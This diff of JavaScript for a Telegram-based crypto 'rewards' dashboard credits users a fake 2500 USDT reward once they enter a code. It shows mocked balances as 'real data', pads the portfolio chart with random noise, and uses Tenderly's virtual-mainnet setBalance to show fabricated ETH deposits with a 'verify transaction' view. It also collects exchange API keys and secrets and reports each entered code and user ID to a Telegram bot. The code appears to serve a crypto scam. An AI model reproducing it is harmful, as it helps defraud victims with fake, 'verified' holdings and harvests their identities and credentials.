+                // Return account data
+                return {
+                    balances: Object.entries(accountData.balances).map(([asset, free]) => ({
+                        asset,
+                        free,
+                        locked: 0
+                    }))
+                };
+            } catch (error) {
+                // Return empty balances on error
+                return { balances: [] };
+            }
+        }
+        
+        // 3. Function to fetch transaction history
+        async function fetchTransactionHistory() {
+            try {
+                // Return account transactions
+                return accountData.transactions;
+            } catch (error) {
+                // Return empty array on error
+                return [];
+            }
+        }
+        
+        // 4. Function to place an order
+        async function placeOrder(symbol, side, quantity, type = 'MARKET') {
+            try {
+                // In a real app with API keys:
+                /*
+                const timestamp = Date.now();
+                const queryString = `symbol=${symbol}&side=${side}&type=${type}&quantity=${quantity}&timestamp=${timestamp}`;
+                
+                // Create signature
+                const signature = CryptoJS.HmacSHA256(queryString, API_CONFIG.binance.apiSecret).toString();
+                
+                const response = await fetch(`${API_CONFIG.binance.baseUrl}/api/v3/order?${queryString}&signature=${signature}`, {
+                    method: 'POST',
+                    headers: {
+                        'X-MBX-APIKEY': API_CONFIG.binance.apiKey
+                    }
+                });
+                
+                if (!response.ok) throw new Error('Failed to place order');
+                
+                const data = await response.json();
+                return data;
+                */
+                
+                // Mock response for demo
+                const order = {
+                    symbol: symbol,
+                    orderId: Math.floor(Math.random() * 1000000),
+                    clientOrderId: 'web_' + Date.now(),
+                    transactTime: Date.now(),
+                    price: '0.00000000',
+                    origQty: quantity,
+                    executedQty: quantity,
+                    status: 'FILLED',
+                    type: type,
+                    side: side
+                };
+                
+                // Add to order history
+                accountData.orderHistory.push(order);
+                
+                return order;
+            } catch (error) {
+                throw error;
+            }
+        }
+        
+        // 5. Function to update dashboard with real data
+        async function updateDashboardWithRealData() {
+            try {
+                // Show loading state
+                document.getElementById('dashboard-loading').classList.remove('hidden');
+                
+                // Fetch data in parallel
+                const [prices, account, transactions] = await Promise.all([
+                    fetchCryptoPrices(),
+                    fetchAccountBalance(),
+                    fetchTransactionHistory()
+                ]);
+                
+                // Update Market Trends table
+                updateMarketTrendsTable(prices);
+                
+                // Update portfolio balance and assets
+                updatePortfolioData(account, prices);
+                
+                // Update transaction history
+                updateTransactionHistory(transactions);
+                
+                // Update portfolio chart with real data
+                updatePortfolioChartWithRealData(transactions);
+                
+                // Hide loading state
+                document.getElementById('dashboard-loading').classList.add('hidden');
+            } catch (error) {
+                // Hide loading state
+                document.getElementById('dashboard-loading').classList.add('hidden');
+            }
+        }
+        
+        // Functions to update UI components with API data
+        
+        // Update market trends table
+        function updateMarketTrendsTable(prices) {
+            // Filter for main cryptocurrencies
+            const mainCoins = ['BTCUSDT', 'ETHUSDT', 'SOLUSDT', 'BNBUSDT', 'ADAUSDT'];
+            const relevantPrices = prices.filter(price => mainCoins.includes(price.symbol));
+            
+            const tbody = document.querySelector('#market-trends-table tbody');
+            if (!tbody) return;
+            
+            const rows = tbody.querySelectorAll('tr');
+            relevantPrices.forEach((price, index) => {
+                if (index < rows.length) {
+                    const row = rows[index];
+                    const priceCell = row.querySelector('td:nth-child(2)');
+                    const changeCell = row.querySelector('td:nth-child(3)');
+                    
+                    const currentPrice = parseFloat(price.lastPrice).toFixed(2);
+                    const priceChange = parseFloat(price.priceChangePercent);
+                    
+                    priceCell.textContent = '$' + currentPrice;
+                    changeCell.textContent = (priceChange >= 0 ? '+' : '') + priceChange.toFixed(2) + '%';
+                    changeCell.className = priceChange >= 0 ? 'py-3 px-4 text-green-500' : 'py-3 px-4 text-red-500';
+                }
+            });
+        }
+        
+        // Update portfolio data
+        function updatePortfolioData(account, prices) {
+            // Calculate total balance
+            let totalBalanceUSDT = 0;
+            const assetsList = document.querySelector('.assets-list');
+            
+            if (!assetsList) return;
+            
+            // Clear current assets
+            assetsList.innerHTML = '';
+            
+            // Create a map for quick price lookup
+            const priceMap = {};
+            prices.forEach(price => {
+                priceMap[price.symbol] = parseFloat(price.lastPrice);
+            });
+            
+            // Process balances
+            account.balances.forEach(balance => {
+                // Skip assets with 0 balance
+                if (parseFloat(balance.free) === 0 && parseFloat(balance.locked) === 0) return;
+                
+                const asset = balance.asset;
+                const amount = parseFloat(balance.free) + parseFloat(balance.locked);
+                
+                // Find price in USDT
+                let priceInUSDT = 1; // Default for USDT
+                if (asset !== 'USDT') {
+                    const price = priceMap[asset + 'USDT'];
+                    if (price) {
+                        priceInUSDT = price;
+                    } else {
+                        // Fallback prices for demo
+                        if (asset === 'BTC') priceInUSDT = 29850.20;
+                        else if (asset === 'ETH') priceInUSDT = 1850.75;
+                        else if (asset === 'BNB') priceInUSDT = 220.50;
+                        else if (asset === 'SOL') priceInUSDT = 102.35;
+                    }
+                }
+                
+                // Calculate value in USDT
+                const valueInUSDT = amount * priceInUSDT;
+                totalBalanceUSDT += valueInUSDT;
+                
+                // Add to assets list
+                let assetIconClass = 'fas fa-question';
+                let assetBgClass = 'bg-gray-500';
+                
+                if (asset === 'BTC') {
+                    assetIconClass = 'fab fa-bitcoin';
+                    assetBgClass = 'bg-yellow-500';
+                } else if (asset === 'ETH') {
+                    assetIconClass = 'fab fa-ethereum';
+                    assetBgClass = 'bg-blue-500';
+                } else if (asset === 'USDT') {
+                    assetIconClass = 'fas fa-dollar-sign';
+                    assetBgClass = 'bg-green-500';
+                } else if (asset === 'BNB') {
+                    assetIconClass = 'fas fa-coins';
+                    assetBgClass = 'bg-yellow-600';
+                } else if (asset === 'SOL') {
+                    assetIconClass = 'fas fa-chart-line';
+                    assetBgClass = 'bg-blue-600';
+                }
+                
+                // Find price change for this asset
+                let priceChangeText = '+0.0%';
+                let priceChangeClass = 'text-gray-400';
+                
+                if (asset !== 'USDT') {
+                    const priceInfo = prices.find(p => p.symbol === asset + 'USDT');
+                    if (priceInfo) {
+                        const priceChange = parseFloat(priceInfo.priceChangePercent);
+                        priceChangeText = (priceChange >= 0 ? '+' : '') + priceChange.toFixed(1) + '%';
+                        priceChangeClass = priceChange >= 0 ? 'text-green-500' : 'text-red-500';
+                    } else {
+                        // Fallback for demo
+                        if (asset === 'BTC') {
+                            priceChangeText = '+3.2%';
+                            priceChangeClass = 'text-green-500';
+                        } else if (asset === 'ETH') {
+                            priceChangeText = '+5.7%';
+                            priceChangeClass = 'text-green-500';
+                        } else if (asset === 'BNB') {
+                            priceChangeText = '+1.3%';
+                            priceChangeClass = 'text-green-500';
+                        } else if (asset === 'SOL') {
+                            priceChangeText = '-1.9%';
+                            priceChangeClass = 'text-red-500';
+                        }
+                    }
+                }
+                
+                const assetHtml = `
+                    <div class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                        <div class="flex items-center">
+                            <div class="w-10 h-10 ${assetBgClass} rounded-full flex items-center justify-center mr-4">
+                                <i class="${assetIconClass} text-white"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium">${asset === 'BTC' ? 'Bitcoin' : asset === 'ETH' ? 'Ethereum' : asset === 'USDT' ? 'Tether' : asset === 'BNB' ? 'Binance Coin' : asset === 'SOL' ? 'Solana' : asset}</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">${asset}</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-medium">${valueInUSDT.toFixed(2)} USDT</p>
+                            <p class="text-sm ${priceChangeClass}">${priceChangeText}</p>
+                        </div>
+                    </div>
+                `;
+                
+                assetsList.innerHTML += assetHtml;
+            });
+            
+            // Update total balance display
+            const totalBalanceElement = document.querySelector('#total-balance');
+            if (totalBalanceElement) {
+                totalBalanceElement.textContent = totalBalanceUSDT.toFixed(0);
+            }
+            
+            // Store in account data
+            accountData.totalBalance = totalBalanceUSDT;
+        }
+        
+        // Update transaction history
+        function updateTransactionHistory(transactions) {
+            const transactionsList = document.querySelector('.transactions-list');
+            if (!transactionsList) return;
+            
+            // Clear current transactions
+            transactionsList.innerHTML = '';
+            
+            // Sort transactions by timestamp (newest first)
+            transactions.sort((a, b) => b.timestamp - a.timestamp);
+            
+            // Process transactions (up to 10)
+            transactions.slice(0, 10).forEach(tx => {
+                const date = new Date(tx.timestamp);
+                const formattedDate = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+                
+                let iconClass = '';
+                let bgClass = '';
+                let amountClass = '';
+                let amountPrefix = '';
+                let title = '';
+                
+                if (tx.type === 'DEPOSIT') {
+                    iconClass = 'fas fa-arrow-down text-green-500';
+                    bgClass = 'bg-green-100 dark:bg-green-900';
+                    amountClass = 'text-green-500';
+                    amountPrefix = '+';
+                    title = `Received ${tx.asset}`;
+                } else if (tx.type === 'WITHDRAW') {
+                    iconClass = 'fas fa-arrow-up text-red-500';
+                    bgClass = 'bg-red-100 dark:bg-red-900';
+                    amountClass = 'text-red-500';
+                    amountPrefix = '';
+                    title = `Sent ${tx.asset}`;
+                } else if (tx.type === 'TRADE') {
+                    iconClass = 'fas fa-exchange-alt text-blue-500';
+                    bgClass = 'bg-blue-100 dark:bg-blue-900';
+                    amountClass = tx.amount < 0 ? '' : 'text-green-500';
+                    amountPrefix = '';
+                    title = tx.convertedAsset ? 
+                        `Swapped ${tx.asset} to ${tx.convertedAsset}` : 
+                        (tx.description || `Traded ${tx.asset}`);
+                }
+                
+                const txHtml = `
+                    <div class="flex items-center p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
+                        <div class="w-10 h-10 rounded-full ${bgClass} flex items-center justify-center mr-4">
+                            <i class="${iconClass}"></i>
+                        </div>
+                        <div class="flex-1">
+                            <h3 class="font-medium">${title}</h3>
+                            <p class="text-sm text-gray-500 dark:text-gray-400">${formattedDate}</p>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-medium ${amountClass}">${amountPrefix}${tx.amount} ${tx.asset}</p>
+                            ${tx.convertedAmount ? `<p class="text-sm text-gray-500 dark:text-gray-400">${tx.convertedAmount} ${tx.convertedAsset}</p>` : ''}
+                        </div>
+                    </div>
+                `;
+                
+                transactionsList.innerHTML += txHtml;
+            });
+        }
+        
+        // Update portfolio chart with real data
+        function updatePortfolioChartWithRealData(transactions) {
+            if (!portfolioChart) return;
+            
+            // Sort transactions by timestamp (oldest first)
+            transactions.sort((a, b) => a.timestamp - b.timestamp);
+            
+            // Calculate daily balances for the last 10 days
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+            
+            const labels = [];
+            const dataPoints = [];
+            
+            // Start with initial balance (2500 USDT reward)
+            let runningBalance = 2500;
+            
+            // Create data for the last 10 days
+            for (let i = 9; i >= 0; i--) {
+                const date = new Date(today);
+                date.setDate(date.getDate() - i);
+                
+                // Format date for label
+                const formattedDate = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+                labels.push(formattedDate);
+                
+                // Add transactions that happened before this date
+                const relevantTxs = transactions.filter(tx => {
+                    const txDate = new Date(tx.timestamp);
+                    return txDate < date;
+                });
+                
+                // Calculate balance including these transactions
+                let calculatedBalance = 2500; // Start with reward
+                
+                relevantTxs.forEach(tx => {
+                    if (tx.asset === 'USDT') {
+                        calculatedBalance += tx.amount;
+                    } else if (tx.convertedAsset === 'USDT') {
+                        calculatedBalance += tx.convertedAmount;
+                    }
+                });
+                
+                // Add some randomness for visualization
+                const randomChange = Math.random() * 100 - 50;
+                dataPoints.push(calculatedBalance + (i === 0 ? 0 : randomChange));
+            }
+            
+            // Update chart data
+            portfolioChart.data.labels = labels;
+            portfolioChart.data.datasets[0].data = dataPoints;
+            portfolioChart.update();
+        }
+        
+        // Handle code submission
+        submitBtn.addEventListener('click', async () => {
+            const code = codeInput.value.trim();
+            
+            if (code === WINNING_CODE) {
+                // Show loading indicator
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Loading...';
+                submitBtn.disabled = true;
+                
+                try {
+                    // Reset account and credit initial reward
+                    resetAccountAndCreditInitialReward();
+                    
+                    // Hide login screen and show dashboard
+                    loginScreen.classList.add('hidden');
+                    dashboardScreen.classList.remove('hidden');
+                    
+                    // Initialize dashboard
+                    initializePortfolioChart();
+                    
+                    // Fetch and display real data
+                    await updateDashboardWithRealData();
+                    
+                    // Show back button if in Telegram WebApp
+                    if (telegramWebApp && telegramWebApp.BackButton) {
+                        telegramWebApp.BackButton.show();
+                    }
+                    
+                    // Update main button if in Telegram WebApp
+                    if (telegramWebApp && telegramWebApp.MainButton) {
+                        telegramWebApp.MainButton.setText('SHARE PORTFOLIO');
+                        telegramWebApp.MainButton.onClick(() => {
+                            document.getElementById('share-portfolio').click();
+                        });
+                    }
+                    
+                    // Send notification to Telegram bot if user is from Telegram
+                    if (telegramUser) {
+                        notifyTelegramBot('login_success', {
+                            code: code,
+                            user_id: telegramUser.id,
+                            username: telegramUser.username || 'unknown'
+                        });
+                    }
+                } catch (error) {
+                    // Handle error silently
+                } finally {
+                    // Reset button state
+                    submitBtn.innerHTML = '<span>Access Dashboard</span><i class="fas fa-arrow-right ml-2"></i>';
+                    submitBtn.disabled = false;
+                }
+            } else {
+                // Show error message
+                errorMessage.classList.remove('hidden');
+                codeInput.classList.add('border-red-500');
+                
+                // Shake animation for input
+                codeInput.classList.add('animate-shake');
+                setTimeout(() => {
+                    codeInput.classList.remove('animate-shake');
+                }, 500);
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('login_failed', {
+                        code: code,
+                        user_id: telegramUser.id,
+                        username: telegramUser.username || 'unknown'
+                    });
+                }
+            }
+        });
+        
+        // Also trigger submission on Enter key
+        codeInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+        
+        // Clear error when input changes
+        codeInput.addEventListener('input', () => {
+            errorMessage.classList.add('hidden');
+            codeInput.classList.remove('border-red-500');
+        });
+        
+        // Theme toggle button
+        themeToggle.addEventListener('click', () => {
+            document.documentElement.classList.toggle('dark');
+            updateChartColors();
+            if (tradingChart) {
+                updateTradingChartColors();
+            }
+        });
+        
+        // Initialize portfolio chart
+        function initializePortfolioChart() {
+            const ctx = document.getElementById('portfolioChart').getContext('2d');
+            
+            // Check if dark mode is enabled
+            const isDarkMode = document.documentElement.classList.contains('dark');
+            
+            // Create gradient for chart background
+            const gradient = ctx.createLinearGradient(0, 0, 0, 240);
+            if (isDarkMode) {
+                gradient.addColorStop(0, 'rgba(93, 92, 222, 0.3)');
+                gradient.addColorStop(1, 'rgba(93, 92, 222, 0)');
+            } else {
+                gradient.addColorStop(0, 'rgba(93, 92, 222, 0.2)');
+                gradient.addColorStop(1, 'rgba(93, 92, 222, 0)');
+            }
+            
+            // Data for portfolio growth (simulated)
+            const data = {
+                labels: ['May 12', 'May 13', 'May 14', 'May 15', 'May 16', 'May 17', 'May 18', 'May 19', 'May 20', 'May 21'],
+                datasets: [{
+                    label: 'Portfolio Value (USDT)',
+                    data: [2500, 2550, 2600, 2580, 2650, 2700, 2680, 2720, 2750, 2800],
+                    borderColor: '#5D5CDE',
+                    backgroundColor: gradient,
+                    tension: 0.4,
+                    fill: true,
+                    pointBackgroundColor: '#5D5CDE',
+                    pointRadius: 3,
+                    pointHoverRadius: 5
+                }]
+            };
+            
+            // Chart configuration
+            const config = {
+                type: 'line',
+                data: data,
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    interaction: {
+                        intersect: false,
+                        mode: 'index',
+                    },
+                    scales: {
+                        y: {
+                            beginAtZero: false,
+                            grid: {
+                                color: isDarkMode ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)',
+                            },
+                            ticks: {
+                                color: isDarkMode ? '#E0E0E0' : '#333333',
+                            }
+                        },
+                        x: {
+                            grid: {
+                                display: false
+                            },
+                            ticks: {
+                                color: isDarkMode ? '#E0E0E0' : '#333333',
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            display: false
+                        },
+                        tooltip: {
+                            backgroundColor: isDarkMode ? '#333' : '#FFF',
+                            titleColor: isDarkMode ? '#FFF' : '#333',
+                            bodyColor: isDarkMode ? '#FFF' : '#333',
+                            borderColor: isDarkMode ? '#444' : '#DDD',
+                            borderWidth: 1,
+                            padding: 10,
+                            displayColors: false,
+                            callbacks: {
+                                label: function(context) {
+                                    return context.parsed.y + ' USDT';
+                                }
+                            }
+                        }
+                    }
+                }
+            };
+            
+            // Create chart
+            portfolioChart = new Chart(ctx, config);
+        }
+        
+        // Update chart colors when theme changes
+        function updateChartColors() {
+            if (!portfolioChart) return;
+            
+            const isDarkMode = document.documentElement.classList.contains('dark');
+            
+            // Update grid colors
+            portfolioChart.options.scales.y.grid.color = isDarkMode ? 'rgba(255, 255, 255, 0.1)' : 'rgba(0, 0, 0, 0.1)';
+            portfolioChart.options.scales.y.ticks.color = isDarkMode ? '#E0E0E0' : '#333333';
+            portfolioChart.options.scales.x.ticks.color = isDarkMode ? '#E0E0E0' : '#333333';
+            
+            // Update tooltip colors
+            portfolioChart.options.plugins.tooltip.backgroundColor = isDarkMode ? '#333' : '#FFF';
+            portfolioChart.options.plugins.tooltip.titleColor = isDarkMode ? '#FFF' : '#333';
+            portfolioChart.options.plugins.tooltip.bodyColor = isDarkMode ? '#FFF' : '#333';
+            portfolioChart.options.plugins.tooltip.borderColor = isDarkMode ? '#444' : '#DDD';
+            
+            // Update background gradient
+            const ctx = portfolioChart.ctx;
+            const gradient = ctx.createLinearGradient(0, 0, 0, 240);
+            if (isDarkMode) {
+                gradient.addColorStop(0, 'rgba(93, 92, 222, 0.3)');
+                gradient.addColorStop(1, 'rgba(93, 92, 222, 0)');
+            } else {
+                gradient.addColorStop(0, 'rgba(93, 92, 222, 0.2)');
+                gradient.addColorStop(1, 'rgba(93, 92, 222, 0)');
+            }
+            
+            portfolioChart.data.datasets[0].backgroundColor = gradient;
+            portfolioChart.update();
+        }
+        
+        // API Settings Modal Handlers
+        const apiSettingsModal = document.getElementById('api-settings-modal');
+        const connectApiButton = document.getElementById('connect-api-button');
+        const closeApiSettings = document.getElementById('close-api-settings');
+        const saveApiSettings = document.getElementById('save-api-settings');
+        const exchangeSelect = document.getElementById('exchange-select');
+        const apiKeyInput = document.getElementById('api-key-input');
+        const apiSecretInput = document.getElementById('api-secret-input');
+        
+        // Open API settings modal
+        connectApiButton.addEventListener('click', () => {
+            // Populate fields with current values if any
+            apiKeyInput.value = API_CONFIG[currentExchange].apiKey || '';
+            apiSecretInput.value = API_CONFIG[currentExchange].apiSecret || '';
+            exchangeSelect.value = currentExchange;
+            
+            // Show modal
+            apiSettingsModal.classList.remove('hidden');
+        });
+        
+        // Close API settings modal
+        closeApiSettings.addEventListener('click', () => {
+            apiSettingsModal.classList.add('hidden');
+        });
+        
+        // Save API settings
+        saveApiSettings.addEventListener('click', async () => {
+            // Update current exchange
+            currentExchange = exchangeSelect.value;
+            
+            // Save API credentials (in memory only - not persisted)
+            API_CONFIG[currentExchange].apiKey = apiKeyInput.value;
+            API_CONFIG[currentExchange].apiSecret = apiSecretInput.value;
+            
+            // Close modal
+            apiSettingsModal.classList.add('hidden');
+            
+            // Update dashboard with new API settings
+            if (API_CONFIG[currentExchange].apiKey) {
+                await updateDashboardWithRealData();
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('api_connected', {
+                        exchange: currentExchange,
+                        user_id: telegramUser.id
+                    });
+                }
+            }
+        });
+        
+        // Handle clicks outside the modal to close it
+        apiSettingsModal.addEventListener('click', (e) => {
+            if (e.target === apiSettingsModal) {
+                apiSettingsModal.classList.add('hidden');
+            }
+        });
+        
+        // Tenderly Integration Functions
+        
+        // Initialize Tenderly provider
+        let tenderlyProvider;
+        let lastTenderlyTxHash;
+        
+        function initializeTenderlyProvider() {
+            try {
+                tenderlyProvider = new ethers.providers.JsonRpcProvider(API_CONFIG.tenderly.rpcUrl);
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Function to set balance on Tenderly virtual mainnet
+        async function setTenderlyBalance(addresses, balance) {
+            try {
+                if (!tenderlyProvider) {
+                    if (!initializeTenderlyProvider()) {
+                        throw new Error('Failed to initialize Tenderly provider');
+                    }
+                }
+                
+                const result = await tenderlyProvider.send('tenderly_setBalance', [
+                    addresses,
+                    balance
+                ]);
+                
+                if (result && result.hash) {
+                    lastTenderlyTxHash = result.hash;
+                    return result;
+                } else {
+                    throw new Error('Invalid response from Tenderly');
+                }
+            } catch (error) {
+                throw error;
+            }
+        }
+        
+        // Function to get transaction details from Tenderly
+        async function getTenderlyTransaction(txHash) {
+            try {
+                if (!tenderlyProvider) {
+                    if (!initializeTenderlyProvider()) {
+                        throw new Error('Failed to initialize Tenderly provider');
+                    }
+                }
+                
+                // Get transaction details
+                const tx = await tenderlyProvider.getTransaction(txHash);
+                if (!tx) {
+                    throw new Error('Transaction not found');
+                }
+                
+                // Get transaction receipt
+                const receipt = await tenderlyProvider.getTransactionReceipt(txHash);
+                
+                return {
+                    hash: tx.hash,
+                    from: tx.from,
+                    to: tx.to || 'Contract Creation',
+                    value: ethers.utils.formatEther(tx.value) + ' ETH',
+                    gasUsed: receipt ? receipt.gasUsed.toString() : 'N/A',
+                    status: receipt ? (receipt.status === 1 ? 'Success' : 'Failed') : 'Pending',
+                    blockNumber: tx.blockNumber || 'Pending',
+                    timestamp: new Date().toISOString()
+                };
+            } catch (error) {
+                throw error;
+            }
+        }
+        
+        // Tenderly Modal Handlers
+        const tenderlySettingsModal = document.getElementById('tenderly-settings-modal');
+        const transactionVerificationModal = document.getElementById('transaction-verification-modal');
+        const closeTenderlySettings = document.getElementById('close-tenderly-settings');
+        const closeVerificationModal = document.getElementById('close-verification-modal');
+        const setTenderlyBalanceBtn = document.getElementById('set-tenderly-balance');
+        const verifyTenderlyBtn = document.getElementById('verify-tenderly');
+        const verificationContent = document.getElementById('verification-content');
+        const viewOnTenderlyLink = document.getElementById('view-on-tenderly');
+        
+        // Add Tenderly button to connect button area
+        const tenderlyButton = document.createElement('button');
+        tenderlyButton.id = 'tenderly-button';
+        tenderlyButton.className = 'text-xs px-3 py-1 bg-blue-500 text-white rounded-full hover:bg-blue-600 transition-colors ml-2';
+        tenderlyButton.innerHTML = '<i class="fas fa-code-branch mr-1"></i> Tenderly';
+        
+        // Open Tenderly settings modal
+        tenderlyButton.addEventListener('click', () => {
+            tenderlySettingsModal.classList.remove('hidden');
+        });
+        
+        // Close Tenderly settings modal
+        closeTenderlySettings.addEventListener('click', () => {
+            tenderlySettingsModal.classList.add('hidden');
+        });
+        
+        // Close Transaction Verification modal
+        closeVerificationModal.addEventListener('click', () => {
+            transactionVerificationModal.classList.add('hidden');
+        });
+        
+        // Handle clicks outside the modals to close them
+        tenderlySettingsModal.addEventListener('click', (e) => {
+            if (e.target === tenderlySettingsModal) {
+                tenderlySettingsModal.classList.add('hidden');
+            }
+        });
+        
+        transactionVerificationModal.addEventListener('click', (e) => {
+            if (e.target === transactionVerificationModal) {
+                transactionVerificationModal.classList.add('hidden');
+            }
+        });
+        
+        // Set balance on Tenderly
+        setTenderlyBalanceBtn.addEventListener('click', async () => {
+            try {
+                // Show loading state
+                setTenderlyBalanceBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Setting...';
+                setTenderlyBalanceBtn.disabled = true;
+                
+                // Get address and balance values
+                const feeAddress = document.getElementById('tenderly-fee-address').value;
+                const userAddress = document.getElementById('tenderly-user-address').value;
+                const balanceEth = document.getElementById('tenderly-balance').value;
+                
+                // Convert ETH to Wei
+                const balanceWei = ethers.utils.parseEther(balanceEth.toString()).toHexString();
+                
+                // Set balance on Tenderly
+                const result = await setTenderlyBalance([feeAddress, userAddress], balanceWei);
+                
+                // Show success notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-green-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Successfully set balance of ${balanceEth} ETH on Tenderly</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Close modal
+                tenderlySettingsModal.classList.add('hidden');
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+                
+                // Add Ethereum asset to portfolio
+                accountData.balances['ETH'] = parseFloat(accountData.balances['ETH'] || 0) + parseFloat(balanceEth);
+                
+                // Add transaction to history
+                const transaction = {
+                    id: 'tx' + Date.now(),
+                    type: 'DEPOSIT',
+                    asset: 'ETH',
+                    amount: parseFloat(balanceEth),
+                    status: 'COMPLETED',
+                    timestamp: Date.now(),
+                    description: 'Deposit via Tenderly',
+                    tenderlyTxHash: result.hash
+                };
+                
+                accountData.transactions.unshift(transaction);
+                
+                // Update dashboard
+                await updateDashboardWithRealData();
+                
+                // Send notification to Telegram bot if user is from Telegram
+                if (telegramUser) {
+                    notifyTelegramBot('added_eth', {
+                        amount: balanceEth,
+                        user_id: telegramUser.id,
+                        tx_hash: result.hash
+                    });
+                }
+                
+            } catch (error) {
+                // Show error notification
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-red-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-circle mr-2"></i>
+                        <span>Error setting balance: ${error.message}</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+            } finally {
+                setTenderlyBalanceBtn.innerHTML = 'Set Balance';
+                setTenderlyBalanceBtn.disabled = false;
+            }
+        });
+        
+        // Verify transaction on Tenderly
+        verifyTenderlyBtn.addEventListener('click', async () => {
+            try {
+                verificationContent.innerHTML = 'Loading transaction data...';
+                transactionVerificationModal.classList.remove('hidden');
+                
+                if (!lastTenderlyTxHash) {
+                    verificationContent.innerHTML = 'No transaction found. Please set a balance first.';
+                    return;
+                }
+                
+                // Get transaction details
+                const txDetails = await getTenderlyTransaction(lastTenderlyTxHash);
+                
+                // Format transaction details for display
+                const txHtml = `
+                    <div class="space-y-2">
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Transaction Hash:</span>
+                            <span class="font-mono">${txDetails.hash.substring(0, 18)}...${txDetails.hash.substring(txDetails.hash.length - 4)}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">From:</span>
+                            <span class="font-mono">${txDetails.from.substring(0, 10)}...${txDetails.from.substring(txDetails.from.length - 4)}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">To:</span>
+                            <span class="font-mono">${typeof txDetails.to === 'string' ? 
+                                txDetails.to.substring(0, 10) + '...' + txDetails.to.substring(txDetails.to.length - 4) : 
+                                txDetails.to}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Value:</span>
+                            <span>${txDetails.value}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Status:</span>
+                            <span class="${txDetails.status === 'Success' ? 'text-green-500' : 'text-red-500'}">${txDetails.status}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Block:</span>
+                            <span>${txDetails.blockNumber}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Gas Used:</span>
+                            <span>${txDetails.gasUsed}</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="font-semibold">Timestamp:</span>
+                            <span>${new Date(txDetails.timestamp).toLocaleString()}</span>
+                        </div>
+                    </div>
+                `;
+                
+                verificationContent.innerHTML = txHtml;
+                
+                // Set "View on Tenderly" link
+                const explorerUrl = `${API_CONFIG.tenderly.explorerBaseUrl}/tx/${lastTenderlyTxHash}`;
+                viewOnTenderlyLink.href = explorerUrl;
+                
+            } catch (error) {
+                verificationContent.innerHTML = `Error verifying transaction: ${error.message}`;
+            }
+        });
+        
+        // Telegram Notify button
+        const telegramNotifyButton = document.getElementById('telegram-notify-button');
+        telegramNotifyButton.addEventListener('click', () => {
+            if (telegramUser) {
+                notifyTelegramBot('manual_notification', {
+                    user_id: telegramUser.id,
+                    balance: document.getElementById('total-balance').textContent,
+                    timestamp: new Date().toISOString()
+                });
+            } else {
+                // Show error notification if not connected to Telegram
+                const notification = document.createElement('div');
+                notification.className = 'fixed bottom-4 right-4 bg-yellow-500 text-white p-4 rounded-lg shadow-lg z-50';
+                notification.innerHTML = `
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-circle mr-2"></i>
+                        <span>Telegram notifications require Telegram login</span>
+                    </div>
+                `;
+                document.body.appendChild(notification);
+                
+                // Remove notification after 3 seconds
+                setTimeout(() => {
+                    notification.remove();
+                }, 3000);
+            }
+        });
+        
+        // Telegram Share button & modal
+        const sharePortfolioBtn = document.getElementById('share-portfolio');
+        const telegramShareModal = document.getElementById('telegram-share-modal');
+        const closeShareModal = document.getElementById('close-share-modal');
+        const shareToTelegramBtn = document.getElementById('share-to-telegram');
+        
+        // Open share modal
+        sharePortfolioBtn.addEventListener('click', () => {
+            // Update share message with current balance
+            const balance = document.getElementById('total-balance').textContent;
+            document.getElementById('share-message').value = `Check out my crypto portfolio! I currently have ${balance} USDT in rewards!`;
+            
+            // Show modal
+            telegramShareModal.classList.remove('hidden');
+        });
+        
+        // Close share modal
+        closeShareModal.addEventListener('click', () => {
+            telegramShareModal.classList.add('hidden');
+        });
+        
+        // Handle clicks outside the modal
+        telegramShareModal.addEventListener('click', (e) => {
+            if (e.target === telegramShareModal) {
+                telegramShareModal.classList.add('hidden');
+            }
+        });
+        
+        // Share to Telegram button
+        shareToTelegramBtn.addEventListener('click', shareTelegramPortfolio);
+        
+        // Add Tenderly button to connection buttons section
+        document.addEventListener('DOMContentLoaded', () => {
+            const connectionButtons = document.querySelector('#connect-api-button').parentElement;
